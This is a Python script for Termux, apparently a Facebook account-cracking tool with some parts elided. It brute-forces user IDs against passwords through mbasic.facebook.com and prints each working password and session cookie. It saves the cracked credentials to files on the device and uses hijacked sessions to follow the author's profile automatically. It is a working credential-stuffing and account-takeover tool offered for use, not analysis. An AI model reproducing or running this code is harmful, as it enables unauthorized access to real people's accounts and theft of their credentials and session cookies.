# ASSALAMUALAIKUM 
# SCRIPT NEOWAR RAKIB ahmed 💙
import os
print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] hossain CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS hossainCYBER KING JIBON\033[1;30m")
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/rakib.wr.7?mibextid=ZbWKwL', {
...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/rakib.wr.7?mibextid=ZbWKwL')
import os
os.system("pkg install espeak")
...
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢R🌹⃝࿇  \033[38;5;46m║\033[38;5;46mRAKIB-KING           ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢X🌹⃝࿇  \033[38;5;46m║\033[38;5;46mJoy Ahomed Rakib  ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢R🌹⃝࿇  \033[38;5;46m║\033[38;5;46m017814***82     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46mRAKIB-KING-404 ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢K🌹⃝࿇  \033[38;5;46m║\033[38;5;46m017814***82     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢I🌹⃝࿇  \033[38;5;46m║\033[38;5;46m017814***82     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢B🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢X🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
os.system('espeak -a 300 "m r x Bd termux Hackr. com"')
os.system('espeak -a 300 "Facebook  Hackr vai"')
os.system('espeak -a 300 "whathapp 0 1 7 8 1 4 * * * 8 2 "')
os.system('espeak -a 300 "github RAKIB-KING-404 "')
os.system('espeak -a 300 "telegram 0 1 7 8 1 4 * * * 8 2 "')
os.system('espeak -a 300 "imo 0 1 7 8 1 4 * * * 82"')
os.system('espeak -a 300 "from Bangladesh "')
os.system('espeak -a 300 "WELCOME Assalamu Alaikum I hossainwill fast in the month of Ramadan inshallah"')
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [MRX-RAK-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/MRX-RAKIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [MRX-RAKIB💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/\033[38;5;46MRX-RAKIB.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['hossainCYBER','RAKIB-CYBER ','hossainCRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝RAKIB𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mMRX-RAKIB💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()